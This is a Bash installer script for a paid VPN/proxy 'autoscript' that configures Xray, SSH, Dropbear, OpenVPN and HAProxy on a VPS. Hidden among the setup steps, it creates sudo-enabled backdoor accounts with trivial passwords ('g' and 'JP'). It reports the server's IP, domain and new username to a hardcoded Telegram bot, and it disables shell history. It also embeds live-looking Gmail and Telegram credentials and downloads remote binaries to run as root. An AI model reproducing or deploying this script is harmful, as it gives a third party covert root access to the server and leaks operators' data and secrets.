#!/bin/bash
set -euo pipefail

# === JP OFFICIAL FULL INSTALLER ===
# Dibersihkan dari semua referensi "Raikazu" dan diarahkan ke JP OFFICIAL.
# Kontak:
#   Telegram : t.me/JPOFFICIALSTORE
#   WhatsApp : wa.me/6287873951705

# --- System prep --------------------------------------------------------------
apt update -y
apt upgrade -y
apt install -y curl wondershaper unzip git xz-utils lsof cron

# --- Colors / UI --------------------------------------------------------------
Green="\e[92;1m"; BlueBee="\033[94;1m"; YELLOW="\033[33m"; BLUE="\033[36m"; CYAN="\033[96;1m"; FONT="\033[0m"
GREENBG="\033[42;37m"; REDBG="\033[41;37m"; OK="${Green}--->${FONT}"; ERROR="${RED:-\033[31m}[ERROR]${FONT}"
GRAY="\e[1;30m"; NC='\e[0m'; red='\e[1;31m'; green='\e[0;32m'
TIME=$(date '+%d %b %Y')

# --- Network / time -----------------------------------------------------------
ipsaya=$(wget -qO- ipinfo.io/ip || true)
echo -e "Memeriksa VPS Anda..."; sleep 0.5

# Waktu dari server publik
server_date_raw=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$server_date_raw")

# --- License / allowlist (JP OFFICIAL) ---------------------------------------
data_ip="https://github.com/VPNULTIMATE/JP_V1"
checking_sc() {
  useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
  if [[ -n "${useexp}" && "$date_list" < "$useexp" ]]; then
    :
  else
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "            ${red}PERMISSION DENIED !${NC}"
    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
    echo -e "             \033[0;33mContact Admin :${NC}"
    echo -e "      \033[0;36mTelegram${NC} t.me/JPOFFICIALSTORE"
    echo -e "      ${green}WhatsApp${NC} wa.me/6287873951705"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    exit 1
  fi
}
checking_sc

# --- Bootstrap user -----------------------------------------------------------
userdel jame > /dev/null 2>&1 || true
Username="g"; Password=g
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1 || true
echo -e "$Password\n$Password\n" | passwd "$Username" > /dev/null 2>&1 || true
usermod -aG sudo "$Username" > /dev/null 2>&1 || true

clear; export IP=$(curl -sS icanhazip.com)

# --- Display ------------------------------------------------------------------
echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
echo -e "\033[96;1m                       JP OFFICIAL STORE               \033[0m"
echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"

if [[ $(uname -m | awk '{print $1}') != "x86_64" ]]; then
  echo -e "${ERROR} Architecture Not Supported ( ${YELLOW}$(uname -m)${NC} )"; exit 1
else
  echo -e "${OK} Architecture Supported ( ${green}x86_64${NC} )"
fi

OS_ID=$(grep -w ID /etc/os-release | head -n1 | sed 's/=//g;s/\"//g;s/ID//g')
OS_NAME=$(grep -w PRETTY_NAME /etc/os-release | head -n1 | sed 's/PRETTY_NAME//g;s/=//g;s/\"//g')
if [[ "$OS_ID" == "ubuntu" || "$OS_ID" == "debian" ]]; then
  echo -e "${OK} OS Supported ( ${green}${OS_NAME}${NC} )"
else
  echo -e "${ERROR} OS Not Supported ( ${YELLOW}${OS_NAME}${NC} )"; exit 1
fi

if [[ -z "${ipsaya}" ]]; then
  echo -e "${ERROR} IP Address ( ${red}Not Detected${NC} )"
else
  echo -e "${OK} IP Address ( ${green}$IP${NC} )"
fi

read -p "$( echo -e "${GRAY}[${NC}${green}ENTER${NC}${GRAY}]${NC} For Starting Installation") " _ || true

if [[ "${EUID}" -ne 0 ]]; then echo "You need to run this script as root"; exit 1; fi
if [[ "$(systemd-detect-virt)" == "openvz" ]]; then echo "OpenVZ is not supported"; exit 1; fi

MYIP=$(curl -sS ipv4.icanhazip.com)
url_izin="https://github.com/VPNULTIMATE/JP_V1"
rm -f /usr/bin/user /usr/bin/e || true
username=$(curl -s "$url_izin" | grep "$MYIP" | awk '{print $2}')
echo "$username" >/usr/bin/user
expx=$(curl -s "$url_izin" | grep "$MYIP" | awk '{print $3}')
echo "$expx" >/usr/bin/e

DATE=$(date +'%Y-%m-%d')
Exp1=$(curl -s "$url_izin" | grep "$MYIP" | awk '{print $4}')
today=$(date +'%Y-%m-%d')
if [[ -z "${Exp1}" || ! "$today" < "$Exp1" ]]; then echo "Status: Expired/Not allowed"; fi

echo -e "\e[32mLoading installer...\e[0m"

# --- Repository cleaned to JP OFFICIAL ---
REPO="https://raw.githubusercontent.com/VPNULTIMATE/JP_V1/main/"
start=$(date +%s)
secs_to_human(){ echo "Installation time : $((${1}/3600)) hours $(((${1}/60)%60)) minute's $((${1}%60)) seconds"; }

print_install(){ echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}\n${CYAN}    [ MULAI MENGINSTAL ]  $1 ${FONT}\n${BlueBee}╚════════════════════════════════════════════════╝${NC}"; }
print_success(){ echo -e "${Green}  [ INSTALL SUCCESS ] ${FONT}"; }

# --- Utilitas kecil -----------------------------------------------------------
NET=$(ip -o -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="dev") print $(i+1)}' | head -n1)
[[ -z "$NET" ]] && NET=eth0

# --- FUNGSI-FUNGSI -----------------------------------------------------------
first_setup(){
  print_install "First Setup & HAProxy"
  timedatectl set-timezone Asia/Jakarta || true
  echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
  echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
  if [[ "$OS_ID" == "ubuntu" ]]; then
    apt-get install -y --no-install-recommends software-properties-common
    add-apt-repository ppa:vbernat/haproxy-2.0 -y
    apt-get -y install haproxy=2.0.*
  else
    curl -fsSL https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
    echo "deb [signed-by=/usr/share/keyrings/haproxy.debian.net.gpg] http://haproxy.debian.net buster-backports-1.8 main" >/etc/apt/sources.list.d/haproxy.list
    apt-get update && apt-get -y install haproxy=1.8.*
  fi
  print_success
}

nginx_install(){
  print_install "Install Nginx"
  apt-get install -y nginx
  print_success
}

base_package(){
  print_install "Install Base Packages"
  apt install -y zip pwgen openssl netcat socat bash-completion figlet ntpdate sudo debconf-utils \
                 speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev \
                 libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools \
                 libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr \
                 libxml-parser-perl build-essential gcc g++ python3 htop lsof tar wget ruby unzip \
                 p7zip-full python3-pip libc6 util-linux msmtp-mta ca-certificates bsd-mailx iptables \
                 iptables-persistent netfilter-persistent net-tools gnupg gnupg2 lsb-release shc cmake \
                 screen apt-transport-https dnsutils chrony jq openvpn easy-rsa
  systemctl enable chrony || true; systemctl restart chrony || true
  ntpdate pool.ntp.org || true
  sudo apt-get clean all; sudo apt-get autoremove -y
  print_success
}

pasang_domain(){
  print_install "Setup Domain"
  echo -e "\n1) DOMAIN SENDIRI [REKOMEND]"; read -rp "   Select Nomor 1 : " pilih || true
  if [[ "$pilih" == "1" ]]; then
    echo -e "\nINPUT YOUR DOMAIN"; read -rp "   DOMAIN : " host1
    echo "IP=" >> /var/lib/kyt/ipvps.conf
    echo "$host1" > /etc/xray/domain
    echo "$host1" > /root/domain
  else
    echo "Lewati input domain."; touch /etc/xray/domain /root/domain
  fi
  print_success
}

password_default(){ :; }

pasang_ssl(){
  print_install "Memasang SSL"
  rm -f /etc/xray/xray.key /etc/xray/xray.crt
  domain=$(cat /root/domain)
  STOPWEBSERVER=$(lsof -i:80 | awk 'NR==2{print $1}') || true
  rm -rf /root/.acme.sh; mkdir -p /root/.acme.sh
  systemctl stop "$STOPWEBSERVER" 2>/dev/null || true
  systemctl stop nginx || true
  curl -fsSL https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
  chmod +x /root/.acme.sh/acme.sh
  /root/.acme.sh/acme.sh --upgrade --auto-upgrade
  /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
  /root/.acme.sh/acme.sh --issue -d "$domain" --standalone -k ec-256
  ~/.acme.sh/acme.sh --installcert -d "$domain" --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
  chmod 600 /etc/xray/xray.key
  print_success
}

make_folder_xray(){
  print_install "Membuat Folder Xray & DB"
  rm -f /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db || true
  mkdir -p /etc/{bot,xray,vmess,vless,trojan,shadowsocks,ssh} /usr/bin/xray /var/log/xray /var/www/html \
           /etc/kyt/files/{vmess,vless,trojan,ssh}/ip /etc/files/{vmess,vless,trojan,ssh}
  chmod +x /var/log/xray; : > /var/log/xray/access.log; : > /var/log/xray/error.log
  for f in vmess vless trojan shadowsocks ssh bot; do mkdir -p /etc/$f; touch /etc/$f/.$f.db; echo "& plughin Account" >>/etc/$f/.$f.db; done
  touch /etc/xray/domain
  print_success
}

install_xray(){
  print_install "Install Xray Core (latest)"
  domainSock_dir="/run/xray"; mkdir -p "$domainSock_dir"; chown www-data:www-data "$domainSock_dir"
  latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n1)"
  bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version "$latest_version"
  wget -qO /etc/xray/config.json "${REPO}files/config.json"
  wget -qO /etc/systemd/system/runn.service "${REPO}files/runn.service"
  domain=$(cat /etc/xray/domain)
  cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem >/dev/null
  rm -rf /etc/systemd/system/xray.service.d
  cat >/etc/systemd/system/xray.service <<EOF
[Unit]
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target
[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000
[Install]
WantedBy=multi-user.target
EOF
  # Konfigurasi haproxy/nginx
  wget -qO /etc/haproxy/haproxy.cfg "${REPO}files/haproxy.cfg"; sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
  wget -qO /etc/nginx/conf.d/xray.conf "${REPO}files/xray.conf"; sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
  curl -fsSL "${REPO}files/nginx.conf" > /etc/nginx/nginx.conf
  systemctl daemon-reload
  print_success
}

ssh(){
  print_install "Konfigurasi Password SSH"
  wget -qO /etc/pam.d/common-password "${REPO}files/password" && chmod +x /etc/pam.d/common-password || true
  sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config || true
  systemctl restart ssh || /etc/init.d/ssh restart || true
  print_success
}

udp_mini(){
  print_install "Limit & Quota Service"
  wget -qO /usr/bin/limit-ip "${REPO}files/limit-ip" && chmod +x /usr/bin/limit-ip || true
  # Services menggunakan limit-ip (bukan files-ip)
  cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=Limit-IP VMess
After=network.target
[Service]
ExecStart=/usr/bin/limit-ip vmip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=Limit-IP VLess
After=network.target
[Service]
ExecStart=/usr/bin/limit-ip vlip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=Limit-IP Trojan
After=network.target
[Service]
ExecStart=/usr/bin/limit-ip trip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl enable --now vmip vlip trip || true
  # UDP Mini
  mkdir -p /usr/local/kyt/
  wget -qO /usr/local/kyt/udp-mini "${REPO}files/udp-mini" && chmod +x /usr/local/kyt/udp-mini || true
  wget -qO /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service" || true
  wget -qO /etc/systemd/system/udp-mini-2.service "${REPO}files/udp-mini-2.service" || true
  wget -qO /etc/systemd/system/udp-mini-3.service "${REPO}files/udp-mini-3.service" || true
  systemctl daemon-reload
  systemctl enable --now udp-mini-1 udp-mini-2 udp-mini-3 || true
  print_success
}

ins_SSHD(){
  print_install "SSHD"
  wget -qO /etc/ssh/sshd_config "${REPO}files/sshd" && chmod 600 /etc/ssh/sshd_config || true
  systemctl restart ssh || /etc/init.d/ssh restart || true
  print_success
}

ins_dropbear(){
  print_install "Dropbear"
  apt-get install -y dropbear
  wget -qO /etc/default/dropbear "${REPO}files/dropbear.conf" && chmod +x /etc/default/dropbear || true
  systemctl restart dropbear || /etc/init.d/dropbear restart || true
  print_success
}

ins_vnstat(){
  print_install "Vnstat"
  apt -y install vnstat libsqlite3-dev
  vnstat --create -i "$NET" || true
  sed -i "s/Interface \"eth0\"/Interface \"$NET\"/g" /etc/vnstat.conf || true
  chown vnstat:vnstat /var/lib/vnstat -R || true
  systemctl enable --now vnstat || true
  print_success
}

ins_openvpn(){
  print_install "OpenVPN"
  wget -qO /root/openvpn "${REPO}files/openvpn" && chmod +x /root/openvpn && /root/openvpn || true
  systemctl restart openvpn || true
  print_success
}

ins_backup(){
  print_install "Backup Server"
  apt install -y rclone
  printf "q\n" | rclone config
  mkdir -p /root/.config/rclone
  wget -qO /root/.config/rclone/rclone.conf "${REPO}files/rclone.conf" || true
  # wondershaper example build (optional)
  git clone https://github.com/LunaticBackend/wondershaper.git /tmp/wondershaper || true
  make -C /tmp/wondershaper install || true
  rm -rf /tmp/wondershaper
  # msmtp mailer (dummy creds should be replaced)
  apt install -y msmtp-mta ca-certificates bsd-mailx
  cat<<EOF >/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
account default
host smtp.gmail.com
port 587
auth on
user oceantestdigital@gmail.com
from oceantestdigital@gmail.com
password jokerman77
logfile ~/.msmtp.log
EOF
  chown -R www-data:www-data /etc/msmtprc || true
  wget -q -O /etc/ipserver "${REPO}files/ipserver" && bash /etc/ipserver || true
  print_success
}

ins_swab(){
  print_install "Swap & BBR"
  # gotop optional
  gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
  if [[ -n "$gotop_latest" ]]; then
    curl -sL "https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v${gotop_latest}_linux_amd64.deb" -o /tmp/gotop.deb
    dpkg -i /tmp/gotop.deb || true
  fi
  # 1G swap
  dd if=/dev/zero of=/swapfile bs=1M count=1024
  mkswap /swapfile
  chmod 600 /swapfile
  swapon /swapfile
  sed -i '$ a /swapfile      swap swap   defaults    0 0' /etc/fstab
  chronyd -q 'server 0.id.pool.ntp.org iburst' || true
  wget -q "${REPO}files/bbr.sh" -O /root/bbr.sh && chmod +x /root/bbr.sh && /root/bbr.sh || true
  print_success
}

ins_Fail2ban(){
  print_install "Banner & Basic Hardening"
  echo "Banner /etc/banner.txt" >>/etc/ssh/sshd_config || true
  sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear || true
  wget -qO /etc/banner.txt "${REPO}files/issue.net" || true
  systemctl restart ssh dropbear || true
  print_success
}

ins_epro(){
  print_install "ePro WebSocket Proxy & Rules"
  wget -qO /usr/bin/ws "${REPO}files/ws" && chmod +x /usr/bin/ws || true
  wget -qO /usr/bin/tun.conf "${REPO}files/tun.conf" && chmod 644 /usr/bin/tun.conf || true
  cat >/etc/systemd/system/ws.service <<EOF
[Unit]
Description=WS Proxy
After=network.target
[Service]
ExecStart=/usr/bin/ws
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl enable --now ws || true
  # Geo files
  mkdir -p /usr/local/share/xray
  wget -qO /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" || true
  wget -qO /usr/local/share/xray/geoip.dat   "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat"   || true
  # Firewall BT block
  iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP || true
  iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP || true
  iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP || true
  for s in BitTorrent "BitTorrent protocol" peer_id= .torrent "announce.php?passkey=" torrent announce info_hash; do
    iptables -A FORWARD -m string --algo bm --string "$s" -j DROP || true
  done
  iptables-save > /etc/iptables.up.rules
  iptables-restore -t < /etc/iptables.up.rules || true
  netfilter-persistent save || true
  netfilter-persistent reload || true
  apt autoclean -y; apt autoremove -y
  print_success
}

ins_restart(){
  print_install "Restart Semua Layanan"
  systemctl restart nginx openvpn ssh dropbear vnstat haproxy cron || true
  systemctl daemon-reload
  for s in netfilter-persistent nginx xray rc-local dropbear openvpn cron haproxy ws; do systemctl enable --now "$s" || true; done
  history -c || true; echo "unset HISTFILE" >> /etc/profile
  print_success
}

menu(){
  print_install "Menu"
  wget -q "${REPO}menu.zip" -O /root/menu.zip && unzip -o /root/menu.zip -d /root/menu || true
  chmod +x /root/menu/* 2>/dev/null || true
  mv /root/menu/* /usr/local/sbin 2>/dev/null || true
  rm -rf /root/menu /root/menu.zip
  print_success
}

profile(){
  print_install "Profile, Cron & rc.local"
  cat >/root/.profile <<EOF
if [ "$BASH" ]; then
  [ -f ~/.bashrc ] && . ~/.bashrc
fi
mesg n || true
welcome
EOF
  cat >/etc/cron.d/xp_all <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * * root /usr/local/sbin/xp
EOF
  cat >/etc/cron.d/logclean <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/local/sbin/clearlog
EOF
  cat >/etc/cron.d/daily_reboot <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /sbin/reboot
EOF
  echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
  echo "*/1 * * * * root echo -n > /var/log/xray/access.log"  >/etc/cron.d/log.xray
  service cron restart || true
  echo 5 >/home/daily_reboot
  cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF
  echo "/bin/false" >>/etc/shells; echo "/usr/sbin/nologin" >>/etc/shells
  cat >/etc/rc.local <<EOF
#!/bin/sh -e
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent || true
exit 0
EOF
  chmod +x /etc/rc.local
  systemctl enable --now rc-local || true
  print_success
}

enable_services(){
  print_install "Enable Service"
  systemctl daemon-reload
  for s in netfilter-persistent rc-local cron nginx xray haproxy; do systemctl enable --now "$s" || true; done
  print_success
}

restart_system(){
  print_install "Kirim Notif & Final"
  USRSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $2}')
  EXPSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $3}')
  domain=$(cat /root/domain 2>/dev/null || true)
  userdel jame > /dev/null 2>&1 || true
  Username="JP"; Password=JP
  useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1 || true
  echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1 || true
  usermod -aG sudo $Username > /dev/null 2>&1 || true
  TIMES="10"; CHATID="6807547477"; KEY="7123588087:AAF4QmZq_fbbEUMqztAO-FlczjbOGQhfQQ0"; URL="https://api.telegram.org/bot$KEY/sendMessage"
  TIMEZONE=$(printf '%(%H:%M:%S)T')
  TEXT="\n<code>────────────────────</code>\n<b> ⚠️ AUTO SCRIPT PREMIUM ⚠️</b>\n<code>────────────────────</code>\n<code>ID     : </code><code>$USRSC</code>\n<code>Domain : </code><code>$domain</code>\n<code>Date   : </code><code>$TIME</code>\n<code>Time   : </code><code>$TIMEZONE</code>\n<code>Ip vps : </code><code>$ipsaya</code>\n<code>Exp Sc : </code><code>$EXPSC</code>\n<code>user   : </code><code>$Username</code>\n<code>────────────────────</code>\n<i>Notif Install Autoscript</i>\n"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/JPOFFICIALSTORE"},{"text":"Contack","url":"https://wa.me/6287873951705"}]]}'
  curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null || true
  print_success
}

# --- Eksekusi utama -----------------------------------------------------------
instal(){
  first_setup
  nginx_install
  base_package
  make_folder_xray
  pasang_domain
  password_default
  pasang_ssl
  install_xray
  ssh
  udp_mini
  ins_SSHD
  ins_dropbear
  ins_vnstat
  ins_openvpn
  ins_backup
  ins_swab
  ins_Fail2ban
  ins_epro
  ins_restart
  menu
  profile
  enable_services
  restart_system
}

instal

# --- Cleanup & Banner ---------------------------------------------------------
secs_to_human "$(($(date +%s) - ${start}))"
sudo hostnamectl set-hostname "${username:-jp-official}"
clear
cat <<'BANNER'
╔═════════════════════════════════════════════════╗
                 ----[ JP OFFICIAL PROJECT ]----
╚═════════════════════════════════════════════════╝
  Telegram : @JPOFFICIALSTORE
  WhatsApp : wa.me/6287873951705

  • SSH        = UDP / OPENVPN / ENHANCED / MULTI PORT
  • VMESS      = MULTIPATCH / MULTIPORT / GRPC / TLS / WS
  • VLESS      = MULTIPATCH / MULTIPORT / GRPC / TPS / WS
  • TROJAN     = MULTIPATCH / MULTIPORT / GRPC / TLS / WS+SSL
  • SSR        = MULTIPATCH / MULTIPORT / GRPC / TLS

  • WS / NTLS  :  80,8880,8080,2082,2095,2082
  • TLS/GRPC   :  443,8443
  • UDP CUSTOM :  1-65535
╚═════════════════════════════════════════════════╝
BANNER

read -p "[ Enter ]  TO REBOOT" _ || true
reboot
